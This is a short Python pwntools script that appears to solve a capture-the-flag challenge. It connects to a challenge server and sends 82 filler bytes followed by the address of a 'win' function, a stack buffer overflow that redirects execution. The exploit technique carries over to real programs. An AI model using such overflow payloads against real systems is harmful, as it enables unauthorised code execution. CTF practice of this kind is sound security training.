#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

# Target
HOST = 'ctf-chall.stembascc.com'
PORT = 5202

# Address
win_addr = 0x080491f3

# Connect
io = remote(HOST, PORT)

# Receive prompt
io.recvuntil(b'hari ini:')

# Send payload
payload = b'A' * 82 + p32(win_addr)
io.sendline(payload)

# Receive all output
try:
    data = io.recvall(timeout=2)
    print(data.decode())
except:
    pass

io.close()
